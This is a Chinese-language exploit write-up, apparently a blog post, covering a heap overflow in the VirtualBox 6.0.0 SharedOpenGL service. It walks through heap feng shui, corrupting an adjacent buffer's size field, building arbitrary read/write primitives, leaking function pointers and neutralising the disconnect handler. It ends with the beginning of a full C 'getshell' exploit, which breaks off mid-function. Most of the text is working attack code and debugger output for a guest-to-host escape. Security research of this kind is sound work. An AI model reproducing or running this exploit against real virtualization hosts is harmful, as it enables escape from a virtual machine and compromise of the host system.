<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">uint32_t msg[] = &#123;CR_MESSAGE_OPCODES, //type</span><br><span class="line">             0x66666666, //conn_id</span><br><span class="line">             1, //numOpcodes</span><br><span class="line">             CR_EXTEND_OPCODE &lt;&lt; 24,</span><br><span class="line">             0x12345678,</span><br><span class="line">             CR_SHADERSOURCE_EXTEND_OPCODE, //extend opcode</span><br><span class="line">             0, //shader</span><br><span class="line">             2, //count</span><br><span class="line">             0, //hasNonLocalLen</span><br><span class="line">             0x1,0x100, // *pLocalLength</span><br><span class="line">             0x12345678 //padding</span><br><span class="line">             &#125;;</span><br><span class="line">for (int i=0;i&lt;0x1000-0x4;i++) &#123;</span><br><span class="line">    alloc_buf(client,sizeof(msg),&quot;heap fengshui&quot;,23);</span><br><span class="line">&#125;</span><br><span class="line">int buf1 = alloc_buf(client,sizeof(msg),msg,sizeof(msg));</span><br><span class="line">int buf2 = alloc_buf(client,sizeof(msg),&quot;aaaaaaaaaaaaa&quot;,sizeof(msg));</span><br><span class="line">int buf3 = alloc_buf(client,sizeof(msg),&quot;bbbbbbbbbbbbb&quot;,sizeof(msg));</span><br><span class="line">int buf4 = alloc_buf(client,sizeof(msg),&quot;ccccccccccccc&quot;,sizeof(msg));</span><br><span class="line">crmsg_with_bufid(client,buf1);</span><br></pre></td></tr></table></figure>
<p>如上代码，我们选择buf1作为<code>cr_unpackData</code>，想要通过buf1溢出修改buf2的<code>uiSize</code>，调试如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/unpacker/unpack_shaders.c</span><br><span class="line">   79     if (!ppStrings) return;</span><br><span class="line">   80 </span><br><span class="line">   81     for (i = 0; i &lt; count; ++i)</span><br><span class="line">   82     &#123;</span><br><span class="line">   83         ppStrings[i] = DATA_POINTER(pos, char);</span><br><span class="line"> ► 84         pos += pLocalLength[i];</span><br><span class="line">   85         if (!length)</span><br><span class="line">   86         &#123;</span><br><span class="line">   87             pLocalLength[i] -= 1;</span><br><span class="line">   88         &#125;</span><br><span class="line">   89 </span><br><span class="line">pwndbg&gt; x /2gx ppStrings</span><br><span class="line">0x7fb890f34ed0:	0x00007fb893001fcc	0x00007fb893001fcd</span><br><span class="line">pwndbg&gt; x /20gx 0x00007fb893001fcd</span><br><span class="line">0x7fb893001fcd:	0x0000000000123456	0x0000000035000000</span><br><span class="line">0x7fb893001fdd:	0x3000007b06000000	0xb893002010000000</span><br><span class="line">0x7fb893001fed:	0xb893001f7000007f	0xb89300205000007f</span><br><span class="line">0x7fb893001ffd:	0x000000000000007f	0x0000000045000000</span><br><span class="line">0x7fb89300200d:	0x6161616161000000	0x6161616161616161</span><br><span class="line">0x7fb89300201d:	0x6262626262626200	0x6300626262626262</span><br><span class="line">0x7fb89300202d:	0x6363636363636363	0x4364690063636363</span><br><span class="line">0x7fb89300203d:	0x000000000065696c	0x0000000035000000</span><br><span class="line">0x7fb89300204d:	0x3000007b07000000	0xb893002080000000</span><br><span class="line">0x7fb89300205d:	0xb893001fe000007f	0xb8930020c000007f</span><br></pre></td></tr></table></figure>
<p>通过上面调试的数据，可以知道，我们的堆风水已经弄好了，现在就是溢出，修改buf2的<code>uiSize</code>，我们先通过调试，确定精确的溢出偏移大小，仅达到修改<code>uiSize</code>，保证其后面的数据不被破坏</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/unpacker/unpack_shaders.c</span><br><span class="line">    91         jUpTo = i == count -1 ? pLocalLength[i] - 1 : pLocalLength[i];</span><br><span class="line">    92         for (j = 0; j &lt; jUpTo; ++j)</span><br><span class="line">    93         &#123;</span><br><span class="line">    94             char *pString = ppStrings[i];</span><br><span class="line">    95 </span><br><span class="line"> ►  96             if (pString[j] == &#x27;\0&#x27;)</span><br><span class="line">    97             &#123;</span><br><span class="line">    98                 Assert(j == jUpTo - 1);</span><br><span class="line">    99                 pString[j] = &#x27;\n&#x27;;</span><br><span class="line">   100             &#125;</span><br><span class="line">   101         &#125;</span><br><span class="line">pwndbg&gt; x /20wx pString+0x3</span><br><span class="line">0x7fb893001fd0:	0x00000000	0x00000000	0x00000035	0x00000000</span><br><span class="line">0x7fb893001fe0:	0x00007b06	0x00000030	0x93002010	0x00007fb8</span><br><span class="line">0x7fb893001ff0:	0x93001f70	0x00007fb8	0x93002050	0x00007fb8</span><br><span class="line">0x7fb893002000:	0x00000000	0x00000000	0x00000045	0x00000000</span><br><span class="line">0x7fb893002010:	0x61616161	0x61616161	0x61616161	0x62620061</span><br></pre></td></tr></table></figure>
<p>我们确定出修改<code>uiSize</code>需要0x1B的偏移<br><img src="https://p3.ssl.qhimg.com/t0176e1335808b0ee43.png"><br>如图，buf2的<code>uiSize</code>已经成功被修改，现在我们就可以利用buf2修改buf3的<code>CRVBOXSVCBUFFER_t</code>结构体，构造任意地址读写原语。由于此处的堆是通过glibc申请的，因此当我们修改<code>uiSize</code>后，glibc堆chunk的头部也已经损坏，此时调用到<code>svcFreeBuffer(pSvcBuffer);</code>时，在glibc2.23环境下，虚拟机会发生崩溃。因此我们在ubuntu 1804上进行测试，由于glibc 2.27有tcache机制，不会检查chunk的size因此可以在glibc 2.27及以上完成利用。当在glibc2.27及以上环境时，我们换一种方式来布置堆风水</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int buf1,buf2,buf3,buf4;</span><br><span class="line">for (int i=0;i&lt;0x4000;i++) &#123;</span><br><span class="line">    buf1 = alloc_buf(client,sizeof(msg),msg,sizeof(msg));</span><br><span class="line">    buf2 = alloc_buf(client,sizeof(msg),&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;,sizeof(msg));</span><br><span class="line">    buf3 = alloc_buf(client,sizeof(msg),&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;,sizeof(msg));</span><br><span class="line">    buf4 = alloc_buf(client,sizeof(msg),&quot;cccccccccccccccccccccccccccccccccccccc&quot;,sizeof(msg));</span><br><span class="line">&#125;</span><br><span class="line">crmsg_with_bufid(client,buf1);</span><br></pre></td></tr></table></figure>
<p>这样使得buf1、buf2、buf3、buf4相邻的可能比较大。<br>现在，我们已经可以通过buf2来控制整个buf3的<code>CRVBOXSVCBUFFER_t</code>了，那么我们可以构造出任意地址写的原语</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int arb_write(int client,uint64_t addr,uint32_t size,void *buf) &#123;</span><br><span class="line">   ArbWrite data = &#123;</span><br><span class="line">      .size = size,</span><br><span class="line">      .addr = addr</span><br><span class="line">   &#125;;</span><br><span class="line">   //set CRVBOXSVCBUFFER_t&#x27;s pData and size</span><br><span class="line">   write_buf(client,oob_buf,0xa30,0x44,&amp;data,sizeof(data));</span><br><span class="line">   //arb write</span><br><span class="line">   write_buf(client,arb_buf,size,0,buf,size);</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有了任意地址写的原语以后，我们就要考虑如何构造任意地址读的原语。在<code>svcCall</code>中，有一条命令<code>SHCRGL_GUEST_FN_READ</code>，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">       case SHCRGL_GUEST_FN_READ:</span><br><span class="line">        &#123;</span><br><span class="line">.........</span><br><span class="line">            /* Fetch parameters. */</span><br><span class="line">            uint8_t *pBuffer  = (uint8_t *)paParms[0].u.pointer.addr;</span><br><span class="line">            uint32_t cbBuffer = paParms[0].u.pointer.size;</span><br><span class="line"></span><br><span class="line">            /* Execute the function. */</span><br><span class="line">            rc = crVBoxServerClientRead(u32ClientID, pBuffer, &amp;cbBuffer);</span><br></pre></td></tr></table></figure>
<p>该命令会调用<code>crVBoxServerClientRead</code>函数，进一步进入<code>crVBoxServerInternalClientRead</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">int32_t crVBoxServerInternalClientRead(CRClient *pClient, uint8_t *pBuffer, uint32_t *pcbBuffer)</span><br><span class="line">&#123;</span><br><span class="line">    if (pClient-&gt;conn-&gt;cbHostBuffer &gt; *pcbBuffer)</span><br><span class="line">    &#123;</span><br><span class="line">        crDebug(&quot;crServer: [%lx] ClientRead u32ClientID=%d FAIL, host buffer too small %d of %d&quot;,</span><br><span class="line">                  crThreadID(), pClient-&gt;conn-&gt;u32ClientID, *pcbBuffer, pClient-&gt;conn-&gt;cbHostBuffer);</span><br><span class="line"></span><br><span class="line">        /* Return the size of needed buffer */</span><br><span class="line">        *pcbBuffer = pClient-&gt;conn-&gt;cbHostBuffer;</span><br><span class="line"></span><br><span class="line">        return VERR_BUFFER_OVERFLOW;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *pcbBuffer = pClient-&gt;conn-&gt;cbHostBuffer;</span><br><span class="line"></span><br><span class="line">    if (*pcbBuffer)</span><br><span class="line">    &#123;</span><br><span class="line">        CRASSERT(pClient-&gt;conn-&gt;pHostBuffer);</span><br><span class="line"></span><br><span class="line">        crMemcpy(pBuffer, pClient-&gt;conn-&gt;pHostBuffer, *pcbBuffer);</span><br><span class="line">        pClient-&gt;conn-&gt;cbHostBuffer = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return VINF_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键的一句代码<code>crMemcpy(pBuffer, pClient-&gt;conn-&gt;pHostBuffer, *pcbBuffer);</code>，可见该命令的作用是将<code>pClient-&gt;conn-&gt;pHostBuffer</code>中的内容拷贝给Guest，由于现在我们实现了任意地址写，并且<code>pClient-&gt;conn</code>的地址也已经知道，那么我们可以控制<code>pHostBuffer</code>，从而实现任意地址读。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int arb_read(int client,uint64_t conn_addr,uint64_t addr,uint32_t size,void *buf) &#123;</span><br><span class="line">   //设置pHostBuffer为目的地址</span><br><span class="line">   arb_write(client,conn_addr+OFFSET_CONN_HOSTBUF,0x8,&amp;addr);</span><br><span class="line">   //设置size</span><br><span class="line">   arb_write(client,conn_addr+OFFSET_CONN_HOSTBUFSZ,0x4,&amp;size);</span><br><span class="line">   //通过SHCRGL_GUEST_FN_READ命令读取pHostBuffer指向的内容</span><br><span class="line">   return read_hostbuf(client,0x100,buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>现在利用任意地址读，泄露出<code>CRConnection</code>中的函数指针</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//读取函数指针，泄露地址</span><br><span class="line">arb_read(new_client,conn_addr,conn_addr + OFFSET_ALLOC_FUNC_PTR,8,buff);</span><br><span class="line">uint64_t alloc_addr = *((uint64_t *)buff);</span><br><span class="line">printf(&quot;alloc_addr=0x%lx\n&quot;,alloc_addr);</span><br></pre></td></tr></table></figure>
<p>当我们调试时，发现当我们的程序运行完毕以后，虚拟机就是崩溃</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; k</span><br><span class="line">#0  __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:51</span><br><span class="line">#1  0x00007f0b1da41921 in __GI_abort () at abort.c:79</span><br><span class="line">#2  0x00007f0b1da8a967 in __libc_message (action=action@entry=do_abort, fmt=fmt@entry=0x7f0b1dbb7b0d &quot;%s\n&quot;) at ../sysdeps/posix/libc_fatal.c:181</span><br><span class="line">#3  0x00007f0b1da919da in malloc_printerr (str=str@entry=0x7f0b1dbb9818 &quot;double free or corruption (out)&quot;) at malloc.c:5342</span><br><span class="line">#4  0x00007f0b1da98f6a in _int_free (have_lock=0, p=0x7f0abb1470a0, av=0x7f0b1ddecc40 &lt;main_arena&gt;) at malloc.c:4308</span><br><span class="line">#5  __GI___libc_free (mem=0x7f0abb1470b0) at malloc.c:3134</span><br><span class="line">#6  0x00007f0b2051da8f in RTMemFree (pv=&lt;optimized out&gt;) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/r3/alloc.cpp:262</span><br><span class="line">#7  0x00007f0abaf25c4f in crFree (ptr=&lt;optimized out&gt;) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/GuestHost/OpenGL/util/mem.c:128</span><br><span class="line">#8  0x00007f0abaf385c9 in _crVBoxCommonDoDisconnectLocked (conn=0x7f0a04b05f50) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/GuestHost/OpenGL/util/vboxhgcm.c:1370</span><br><span class="line">#9  crVBoxHGCMDoDisconnect (conn=0x7f0a04b05f50) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/GuestHost/OpenGL/util/vboxhgcm.c:1412</span><br><span class="line">#10 0x00007f0abb171909 in crVBoxServerRemoveClientObj (pClient=0x7f0a05bd8d70) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/crserverlib/server_main.c:677</span><br><span class="line">#11 crVBoxServerRemoveClient (u32ClientID=43) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/crserverlib/server_main.c:716</span><br><span class="line">#12 0x00007f0abb160945 in svcDisconnect (u32ClientID=&lt;optimized out&gt;, pvClient=&lt;optimized out&gt;) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/crserver/crservice.cpp:144</span><br><span class="line">#13 0x00007f0afdaa1eb4 in hgcmServiceThread (pThread=0x7f0ab0003a60, pvUser=0x7f0ab0003900) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCM.cpp:684</span><br><span class="line">#14 0x00007f0afda9fd5f in hgcmWorkerThreadFunc (hThreadSelf=&lt;optimized out&gt;, pvUser=0x7f0ab0003a60) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCMThread.cpp:200</span><br><span class="line">#15 0x00007f0b204b5e7c in rtThreadMain (pThread=pThread@entry=0x7f0ab0003c90, NativeThread=NativeThread@entry=139684077311744, pszThreadName=pszThreadName@entry=0x7f0ab0004570 &quot;ShCrOpenGL&quot;) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/common/misc/thread.cpp:719</span><br></pre></td></tr></table></figure>
<p>通过栈回溯发现，是因为<code>pHostBuffer</code>在<code>disconnect</code>时，被<code>free</code>了，由于<code>pHostBuffer</code>被我们指向了任意地址，因此不会是一个合法的<code>chunk</code>。但是想到我们并没有对<code>HGCM</code>进行<code>disconnect</code>操作，经过研究发现只要我们的程序结束运行，<code>HGCM</code>就会自动断开。因此解决方法有很多，一种是不让我们的程序结束，结尾放一个死循环；另一种是将<code>disconnect</code>函数指针指向附近的<code>retn</code>指令，使得执行该指令时什么都不做。这里我使用的是第二种方法，因此我们的任意地址读原语</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int arb_read(int client,uint64_t conn_addr,uint64_t addr,uint32_t size,void *buf) &#123;</span><br><span class="line">   char val = 0x64;</span><br><span class="line">   //防止disconnect时free pHostBuffer时崩溃，我们将disconnect函数指针指向附近的retn指令处</span><br><span class="line">   arb_write(client,conn_addr+OFFSET_DISCONN_FUNC_PTR,0x1,&amp;val);</span><br><span class="line">   //设置pHostBuffer为目的地址</span><br><span class="line">   arb_write(client,conn_addr+OFFSET_CONN_HOSTBUF,0x8,&amp;addr);</span><br><span class="line">   //设置size</span><br><span class="line">   arb_write(client,conn_addr+OFFSET_CONN_HOSTBUFSZ,0x4,&amp;size);</span><br><span class="line">   //通过SHCRGL_GUEST_FN_READ命令读取pHostBuffer指向的内容</span><br><span class="line">   stop();</span><br><span class="line">   return read_hostbuf(client,0x100,buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &quot;chromium.h&quot;</span><br><span class="line">#include &quot;hgcm.h&quot;</span><br><span class="line"></span><br><span class="line">#define OFFSET_ALLOC_FUNC_PTR 0xD0</span><br><span class="line">#define OFFSET_DISCONN_FUNC_PTR 0x128</span><br><span class="line">#define OFFSET_PCLIENT 0x248</span><br><span class="line">#define CRVBOXSVCBUFFER_SIZE 0x20</span><br><span class="line">#define OFFSET_CONN_HOSTBUF 0x238</span><br><span class="line">#define OFFSET_CONN_HOSTBUFSZ 0x244</span><br><span class="line"></span><br><span class="line">typedef struct LeakClient &#123;</span><br><span class="line">   int new_client;</span><br><span class="line">   uint64_t client_addr;</span><br><span class="line">   uint64_t conn_addr;</span><br><span class="line">&#125; LeakClient;</span><br><span class="line"></span><br><span class="line">typedef struct ArbWrite &#123;</span><br><span class="line">   uint32_t size;</span><br><span class="line">   uint64_t addr;</span><br><span class="line">&#125; ArbWrite;</span><br><span class="line"></span><br><span class="line">LeakClient leak_client(int client) &#123;</span><br><span class="line">   //heap spray</span><br><span class="line">   for (int i=0;i&lt;600;i++) &#123;</span><br><span class="line">      alloc_buf(client,0x298,&quot;CRConnection_size_fill&quot;,23);</span><br><span class="line">   &#125;</span><br><span class="line">   for (int i=0;i&lt;600;i++) &#123;</span><br><span class="line">      alloc_buf(client,0x9d0,&quot;CRClient_size_fill&quot;,23);</span><br><span class="line">   &#125;</span><br><span class="line">   //CRClient和CRConnection结构体将被创建</span><br><span class="line">   int new_client = hgcm_connect(&quot;VBoxSharedCrOpenGL&quot;);</span><br><span class="line">   for (int i=0;i&lt;600;i++) &#123;</span><br><span class="line">      alloc_buf(client,0x298,&quot;CRConnection_size_fill&quot;,23);</span><br><span class="line">   &#125;</span><br><span class="line">   for (int i=0;i&lt;600;i++) &#123;</span><br><span class="line">      alloc_buf(client,0x9d0,&quot;CRClient_size_fill&quot;,23);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   //释放CRClient和CRConnection结构体</span><br><span class="line">   hgcm_disconnect(new_client);</span><br><span class="line"></span><br><span class="line">   uint32_t msg[] = &#123;CR_MESSAGE_OPCODES, //type</span><br><span class="line">                0x66666666, //conn_id</span><br><span class="line">                1, //numOpcodes</span><br><span class="line">                CR_EXTEND_OPCODE &lt;&lt; 24,</span><br><span class="line">                OFFSET_PCLIENT, //packet_length</span><br><span class="line">                CR_GETUNIFORMLOCATION_EXTEND_OPCODE, //extend opcode</span><br><span class="line">                0, //program</span><br><span class="line">                *(uint32_t *)&quot;leak&quot; //name</span><br><span class="line">                &#125;;</span><br><span class="line">   //将crmsg的unpack_buffer申请占位到之前的CRConnection结构体位置，从而进行数据泄露</span><br><span class="line">   crmsg(client,0x298,msg,sizeof(msg));</span><br><span class="line"></span><br><span class="line">   uint64_t client_addr = *(uint64_t *)(crmsg_buf+0x10);</span><br><span class="line">   uint64_t conn_addr = client_addr +  0x9e0;</span><br><span class="line">   //重新将新的CRClient和CRConnection结构体占位与此</span><br><span class="line">   new_client = hgcm_connect(&quot;VBoxSharedCrOpenGL&quot;);</span><br><span class="line">   LeakClient lc = &#123;</span><br><span class="line">        .new_client = new_client,</span><br><span class="line">        .client_addr = client_addr,</span><br><span class="line">        .conn_addr = conn_addr</span><br><span class="line">   &#125;;</span><br><span class="line">   return lc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int stop() &#123;</span><br><span class="line">   char buf[0x10];</span><br><span class="line">   write(1,&quot;stop&quot;,0x5);</span><br><span class="line">   read(0,buf,0x10);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int oob_buf;</span><br><span class="line">int arb_buf;</span><br><span class="line"></span><br><span class="line">int make_oob_buf(int client) &#123;</span><br><span class="line">   uint32_t msg[] = &#123;CR_MESSAGE_OPCODES, //type</span><br><span class="line">                0x66666666, //conn_id</span><br><span class="line">                1, //numOpcodes</span><br><span class="line">                CR_EXTEND_OPCODE &lt;&lt; 24,</span><br><span class="line">                0x12345678,</span><br><span class="line">                CR_SHADERSOURCE_EXTEND_OPCODE, //extend opcode</span><br><span class="line">                0, //shader</span><br><span class="line">                2, //count</span><br><span class="line">                0, //hasNonLocalLen</span><br><span class="line">                0x1,0x1B, // *pLocalLength</span><br><span class="line">                0x12345678 //padding</span><br><span class="line">                &#125;;</span><br><span class="line">   //heap spray</span><br><span class="line">   int buf1,buf2,buf3,buf4;</span><br><span class="line">   for (int i=0;i&lt;0x5000;i++) &#123;</span><br><span class="line">       buf1 = alloc_buf(client,sizeof(msg),msg,sizeof(msg));</span><br><span class="line">       buf2 = alloc_buf(client,sizeof(msg),&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;,sizeof(msg));</span><br><span class="line">       buf3 = alloc_buf(client,sizeof(msg),&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;,sizeof(msg));</span><br><span class="line">       buf4 = alloc_buf(client,sizeof(msg),&quot;cccccccccccccccccccccccccccccccccccccc&quot;,sizeof(msg));</span><br><span class="line">   &#125;</span><br><span class="line">   crmsg_with_bufid(client,buf1);</span><br><span class="line">   //generate a new id</span><br><span class="line">   char *buf2_id = (char *)&amp;buf2;</span><br><span class="line">   for (int i=0;i&lt;4;i++) &#123;</span><br><span class="line">      if (buf2_id[i] == &#x27;\0&#x27;) buf2_id[i] = &#x27;\n&#x27;;</span><br><span class="line">   &#125;</span><br><span class="line">   //now buf2 was corrupted</span><br><span class="line">   oob_buf = buf2;</span><br><span class="line">   arb_buf = buf3;</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int arb_write(int client,uint64_t addr,uint32_t size,void *buf) &#123;</span><br><span class="line">   ArbWrite data = &#123;</span><br><span class="line">      .size = size,</span><br><span class="line">      .addr = addr</span><br><span class="line">   &#125;;</span><br><span class="line">   //set CRVBOXSVCBUFFER_t&#x27;s pData and size</span><br><span class="line">   